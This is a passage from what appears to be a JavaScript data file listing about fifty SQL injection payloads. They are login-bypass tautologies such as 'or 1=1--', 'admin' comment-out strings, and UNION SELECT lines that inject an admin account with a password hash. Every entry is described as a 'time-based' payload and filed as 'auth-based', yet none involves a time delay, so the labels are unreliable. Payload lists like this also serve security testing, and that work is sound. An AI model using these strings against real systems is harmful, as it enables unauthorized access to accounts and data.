    value: '"'
  },
  {
    id: 'id-fvwsyf387-1743917323191',
    name: 'Time Payload 11',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '"--'
  },
  {
    id: 'id-e1q3dfebl-1743917323191',
    name: 'Time Payload 12',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '"#'
  },
  {
    id: 'id-daawlxv0y-1743917323191',
    name: 'Time Payload 13',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or "1"="1'
  },
  {
    id: 'id-7j4rq7zkt-1743917323191',
    name: 'Time Payload 14',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or "1"="1"--'
  },
  {
    id: 'id-0cxjohv5m-1743917323191',
    name: 'Time Payload 15',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or "1"="1"#'
  },
  {
    id: 'id-ecwi0p4gp-1743917323191',
    name: 'Time Payload 16',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or 1=1--'
  },
  {
    id: 'id-tq9sl9omn-1743917323191',
    name: 'Time Payload 17',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or 1=1#'
  },
  {
    id: 'id-jdczlkyoy-1743917323191',
    name: 'Time Payload 18',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or 1=1/*'
  },
  {
    id: 'id-yidcy2kcd-1743917323191',
    name: 'Time Payload 19',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'or 1=1'
  },
  {
    id: 'id-tzvat3wuj-1743917323191',
    name: 'Time Payload 20',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'or 1=1--'
  },
  {
    id: 'id-ck1f1xkeg-1743917323191',
    name: 'Time Payload 21',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'or 1=1#'
  },
  {
    id: 'id-gmaxybjob-1743917323191',
    name: 'Time Payload 22',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'or 1=1/*'
  },
  {
    id: 'id-js9dgj5n2-1743917323191',
    name: 'Time Payload 23',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' --'
  },
  {
    id: 'id-41i0v1h0e-1743917323191',
    name: 'Time Payload 24',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' #'
  },
  {
    id: 'id-wti9jcw1g-1743917323191',
    name: 'Time Payload 25',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\'/*'
  },
  {
    id: 'id-upmpkhsh1-1743917323191',
    name: 'Time Payload 26',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' or \'1\'=\'1'
  },
  {
    id: 'id-noeli8p0e-1743917323191',
    name: 'Time Payload 27',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' or \'1\'=\'1\'--'
  },
  {
    id: 'id-1672di2l0-1743917323191',
    name: 'Time Payload 28',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' or \'1\'=\'1\'#'
  },
  {
    id: 'id-8hjycy19v-1743917323191',
    name: 'Time Payload 29',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' or 1=1'
  },
  {
    id: 'id-ocll2ixvd-1743917323191',
    name: 'Time Payload 30',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' or 1=1--'
  },
  {
    id: 'id-yfdligvlr-1743917323191',
    name: 'Time Payload 31',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' or 1=1#'
  },
  {
    id: 'id-sd45wmsmp-1743917323191',
    name: 'Time Payload 32',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\' or 1=1/*'
  },
  {
    id: 'id-h3ztgyiun-1743917323191',
    name: 'Time Payload 33',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\') or (\'1\'=\'1'
  },
  {
    id: 'id-p3e2ppj8i-1743917323191',
    name: 'Time Payload 34',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin\') or \'1\'=\'1'
  },
  {
    id: 'id-xmnxw4hxa-1743917323191',
    name: 'Time Payload 35',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin" or "1"="1'
  },
  {
    id: 'id-fyk5a8vm2-1743917323191',
    name: 'Time Payload 36',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 'admin") or ("1"="1'
  },
  {
    id: 'id-q4a62h3df-1743917323191',
    name: 'Time Payload 37',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\') or (\'x\')=(\'x'
  },
  {
    id: 'id-s7jznzi9w-1743917323191',
    name: 'Time Payload 38',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\')) or ((\'x\'))=((\'x'
  },
  {
    id: 'id-d17pp6fe5-1743917323191',
    name: 'Time Payload 39',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or "x"="x'
  },
  {
    id: 'id-vzbjt7v2g-1743917323191',
    name: 'Time Payload 40',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '")) or (("x"))=(("x'
  },
  {
    id: 'id-wmauz8sti-1743917323191',
    name: 'Time Payload 41',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\'-\''
  },
  {
    id: 'id-6erich6ax-1743917323191',
    name: 'Time Payload 42',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' \''
  },
  {
    id: 'id-zsuyek6hp-1743917323191',
    name: 'Time Payload 43',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\'&\''
  },
  {
    id: 'id-9lkr21xry-1743917323191',
    name: 'Time Payload 44',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\'^\''
  },
  {
    id: 'id-k8z97lvj8-1743917323191',
    name: 'Time Payload 45',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\'*\''
  },
  {
    id: 'id-kk54cuk2n-1743917323191',
    name: 'Time Payload 46',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or \'\'-\''
  },
  {
    id: 'id-bz4ouomd3-1743917323191',
    name: 'Time Payload 47',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or \'\' \''
  },
  {
    id: 'id-n2ub54tl6-1743917323191',
    name: 'Time Payload 48',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or \'\'&\''
  },
  {
    id: 'id-03vw2hj2f-1743917323191',
    name: 'Time Payload 49',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or \'\'^\''
  },
  {
    id: 'id-w3wanou6c-1743917323191',
    name: 'Time Payload 50',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or \'\'*\''
  },
  {
    id: 'id-o3zwu7gtk-1743917323191',
    name: 'Time Payload 51',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '"-"'
  },
  {
    id: 'id-at65nyfm5-1743917323191',
    name: 'Time Payload 52',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" "'
  },
  {
    id: 'id-jqx2urffu-1743917323191',
    name: 'Time Payload 53',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '"&"'
  },
  {
    id: 'id-0rtstx9gm-1743917323191',
    name: 'Time Payload 54',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '"^"'
  },
  {
    id: 'id-o2zw52pcf-1743917323191',
    name: 'Time Payload 55',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '"*"'
  },
  {
    id: 'id-elxtxsoub-1743917323191',
    name: 'Time Payload 56',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or ""-"'
  },
  {
    id: 'id-0rf7n40qb-1743917323191',
    name: 'Time Payload 57',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or "" "'
  },
  {
    id: 'id-ys5rmv8wx-1743917323191',
    name: 'Time Payload 58',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or ""&"'
  },
  {
    id: 'id-qs9wrnips-1743917323191',
    name: 'Time Payload 59',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or ""^"'
  },
  {
    id: 'id-0hn68xw8m-1743917323191',
    name: 'Time Payload 60',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '" or ""*"'
  },
  {
    id: 'id-7adtn8tpr-1743917323191',
    name: 'Time Payload 61',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 
      '1234 \' AND 1=0 UNION ALL SELECT \'admin\', \'81dc9bdb52d04dc20036dbd8313ed055'
  },
  {
    id: 'id-orm1snfqo-1743917323191',
    name: 'Time Payload 62',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: 
      '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055'
  }
];